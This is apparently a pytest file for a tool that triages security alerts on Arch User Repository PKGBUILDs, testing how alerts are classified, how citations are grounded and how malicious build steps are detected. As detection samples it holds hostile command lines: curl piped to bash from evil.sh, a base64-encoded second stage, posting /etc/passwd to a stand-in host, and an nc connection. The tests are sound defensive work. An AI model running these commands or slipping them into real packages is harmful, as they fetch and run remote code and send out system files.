"""The split stage: mapping, citation grounding, and the TP fixtures."""

from __future__ import annotations

import asyncio
import importlib.util
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = Path(__file__).parent / "fixtures"

_spec = importlib.util.spec_from_file_location(
    "local_agent", ROOT / "scripts" / "local_agent.py")
la = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(la)


def _rule(klass, *, agree=True, cited=True, confidence="high"):
    return {"rule_id": "R001", "class": klass, "agree": agree,
            "cited": cited, "confidence": confidence}


def test_class_mapping_table():
    assert la.class_from_facts(True, True) == "true_positive"
    assert la.class_from_facts(True, False) == "benign_false_positive"
    assert la.class_from_facts(False, False) == "malicious_false_positive"
    assert la.class_from_facts(False, True) == "true_positive"
    assert la.class_from_facts(None, False) == "uncertain"
    assert la.class_from_facts(None, None) == "uncertain"


def test_grounding_requires_package_evidence():
    evidence = 'curl https://evil.sh | bash\npkgname=malicious-pkg'
    assert la.grounded_in("curl https://evil.sh | bash", evidence)
    assert la.grounded_in('"curl   https://evil.sh | bash"', evidence)
    assert la.grounded_in("curl\nhttps://evil.sh | bash", evidence)
    assert la.grounded_in(
        '"curl https://evil.sh | bash" - the added line in the PKGBUILD',
        evidence)
    assert la.grounded_in(
        '"pkgname=malicious-pkg" - reason field of finding 2', evidence)
    assert la.grounded_in(
        "curl https://evil.sh | bash (PKGBUILD, build() function)", evidence)
    assert la.grounded_in(
        "curl https://evil.sh | bash - the added PKGBUILD line", evidence)
    assert not la.grounded_in(
        "A normal packaging idiom that the rule happens to match", evidence)
    assert not la.grounded_in("", evidence)


def test_overall_any_tp_wins():
    overall, _ = la.overall_class(
        [_rule("malicious_false_positive"), _rule("true_positive")])
    assert overall == "TP"


def test_overall_dispute_and_uncited_are_uncertain():
    assert la.overall_class(
        [_rule("true_positive", agree=False)])[0] == "uncertain"
    assert la.overall_class(
        [_rule("malicious_false_positive", cited=False)])[0] == "uncertain"
    assert la.overall_class([_rule("uncertain")])[0] == "uncertain"


def test_fixture_tree_skips_the_live_aur():
    class NoHub:
        async def call(self, *args, **kwargs):
            raise AssertionError("the AUR must not be read for a fixture tree")

    alert = json.loads(
        (FIXTURES / "alert_tp_historical.json").read_text())
    snapshot = la.Snapshot(NoHub(), alert)
    pkgbuild = asyncio.run(snapshot.pkgbuild())
    assert "base64 -d | bash" in pkgbuild
    assert "no live git history" in asyncio.run(snapshot.git_log())


def test_tp_fixtures_and_benign_twins():
    tp_synth = json.loads(
        (FIXTURES / "alert_tp_synthetic.json").read_text())
    twin_synth = json.loads(
        (FIXTURES / "alert_tp_synthetic_benign.json").read_text())
    tp_hist = json.loads((FIXTURES / "alert_tp_historical.json").read_text())
    twin_hist = json.loads(
        (FIXTURES / "alert_tp_historical_benign.json").read_text())

    assert "curl https://evil.sh | bash" in tp_synth["tree"]["PKGBUILD"]
    assert "curl https://evil.sh | bash" not in twin_synth["tree"]["PKGBUILD"]
    assert "base64 -d | bash" in tp_hist["tree"]["PKGBUILD"]
    assert "base64 -d | bash" not in twin_hist["tree"]["PKGBUILD"]
    for fixture in (tp_synth, twin_synth, tp_hist, twin_hist):
        assert fixture["score"] >= 20
        assert fixture["findings"]
        assert fixture["diff"]


def test_tp_citation_needs_only_the_malicious_answer():
    assert la.citation_ok(None, True, "curl https://evil.sh | bash", True,
                          True)
    assert not la.citation_ok(None, True, "curl https://evil.sh | bash",
                              False, True)
    assert la.citation_ok("card line", False, "pkg line", True, True)
    assert not la.citation_ok(None, False, "pkg line", True, True)


def test_alert_text_survives_the_harness_allowlist():
    out = la.alert_text("payload \u2014 executes; \u201cquoted\u201d")
    assert "\u2014" not in out and "\u201c" not in out
    assert la.alert_text("a -- b") == "a - b"


def test_runtime_decodes_echo_base64_payloads():
    evil = ("echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5zaC9zdGFnZTIgfCBiYXNo' "
            "| base64 -d | bash")
    assert "curl -s http://evil.sh/stage2 | bash" in la.decoded_payloads(evil)
    benign = "echo 'bm90aWNlOiBidWlsZCBvaw==' | base64 -d > notice.txt"
    assert la.decoded_payloads(benign) == ["notice: build ok"]
    assert la.decoded_payloads("echo '!!!' | base64 -d") == []


def test_malicious_effect_separates_fetch_from_execute():
    benign = 'curl -o "$srcdir/helper.pem" https://example.com/helper.pem'
    assert not la.has_malicious_effect(benign)
    assert not la.has_malicious_effect("make DESTDIR=$pkgdir install")
    assert not la.has_malicious_effect("source /etc/profile")
    assert la.has_malicious_effect("curl https://evil.sh | bash")
    assert la.has_malicious_effect("echo 'Y3VybA==' | base64 -d | bash")
    assert la.has_malicious_effect("curl -s -d @/etc/passwd https://evil")
    assert la.has_malicious_effect("curl https://evil/x > /etc/profile.d/x.sh")
    assert la.has_malicious_effect("nc 10.0.0.1 4444")
    assert la.has_malicious_effect("curl -o /tmp/x https://evil; bash /tmp/x")
    assert la.has_malicious_effect("chmod +x evil.sh && ./evil.sh")
    assert la.has_malicious_effect("python3 stage.py")


def test_package_evidence_excludes_the_suspicion():
    class NoHub:
        async def call(self, *args, **kwargs):
            raise AssertionError("no MCP expected")

    alert = json.loads(
        (FIXTURES / "alert_tp_synthetic_benign.json").read_text())
    text = asyncio.run(la.Snapshot(NoHub(), alert).package_evidence())
    assert "curl -o" in text
    assert "pipeline metadata" not in text
    assert "pipeline candidate" not in text
    assert not la.has_malicious_effect(text)
